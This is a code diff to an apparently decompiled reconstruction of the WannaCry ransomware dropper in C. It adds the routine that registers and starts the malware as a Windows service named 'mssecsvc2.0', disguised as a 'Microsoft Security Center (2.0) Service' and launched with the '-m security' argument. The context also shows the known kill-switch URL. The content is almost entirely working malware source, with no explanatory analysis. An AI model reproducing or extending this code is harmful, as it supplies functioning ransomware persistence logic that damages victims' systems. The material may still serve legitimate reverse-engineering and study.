@@ -8,6 +8,8 @@ void Create_SvcsConfigs(void);
 void if_first_time_executing_on_system_do_config(void);
 int create_and_open_wncry_exe_as_service_with_args(void);
 
+
+// global Define Strings ****/
 // arguments to GetProcAddress
 char CreateProcessA_str[] = "CreateProcessA";
 char CreateFileA_str[] = "CreateFileA";
@@ -23,6 +25,9 @@ char MSC_2_0_SvcName[] = "Microsoft Security Center (2.0) Service";
 char wannacry_exe_path[260];
 char mssecsvc2_0_string[] = "mssecsvc2.0";
 char weird_url[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
+char security_arg_str[] = "%s -m security";
+
+/*** END GLOBAL DEFINED STRINGS*/
 
 
 int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd)
@@ -119,5 +124,27 @@ void if_first_time_executing_on_system_do_config(void)
 
 int create_and_open_wncry_exe_as_service_with_args(void)
 {
+    SC_HANDLE OpenSCMangH;
+  SC_HANDLE CreateServiceAH;
+  char *unaff_EDI;
+  char wannacry_exe_with_args [260];
   
+                    /* wannacry_exe_with_args = "C:\Path\To\Wanacry -m security" */
+  sprintf(wannacry_exe_with_args,security_arg_str,(char *)&wannacry_exe_path,unaff_EDI);
+  OpenSCMangH = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
+                    /* in success... */
+  if (OpenSCMangH != (SC_HANDLE)0x0) {
+    CreateServiceAH =
+         CreateServiceA(OpenSCMangH,mssecsvc2_0_string,MSC_2_0_SvcName,983551,0x10,2,1,
+                        wannacry_exe_with_args,(LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,
+                        (LPCSTR)0x0);
+                    /* in success */
+    if (CreateServiceAH != (SC_HANDLE)0x0) {
+      StartServiceA(CreateServiceAH,0,(LPCSTR *)0x0);
+      CloseServiceHandle(CreateServiceAH);
+    }
+    CloseServiceHandle(OpenSCMangH);
+    return 0;
+  }
+  return 0;
 }
